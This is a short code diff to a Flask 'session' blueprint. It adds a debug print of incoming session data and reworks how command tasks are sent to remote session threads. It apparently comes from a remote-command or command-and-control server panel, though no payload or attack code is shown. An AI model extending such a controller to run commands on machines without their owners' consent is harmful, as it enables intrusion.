@@ -11,6 +11,7 @@ session = Blueprint('session', __name__)
 @session.route("/api/session/new", methods=["POST"])
 def session_new():
 	"""Add session metadata to database."""
+	print("DEBUG NEW SESSION ==============>", request.json)
 	if not request.json:
 		return redirect(url_for('main.sessions'))
 	data = dict(request.json)
@@ -66,8 +67,8 @@ def session_cmd():
 		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
 		# send task and get response
-		session_thread.send_task(task)
-		response = session_thread.recv_task()
+		response = session_thread.send_task(task)
+		# response = session_thread.recv_task()
 
 		# update task record with result in database
 		result = task_dao.handle_task(response)
@@ -87,3 +88,5 @@ def session_poll():
 		s.new = False
 		db.session.commit()
 	return jsonify(new_sessions)
+
+
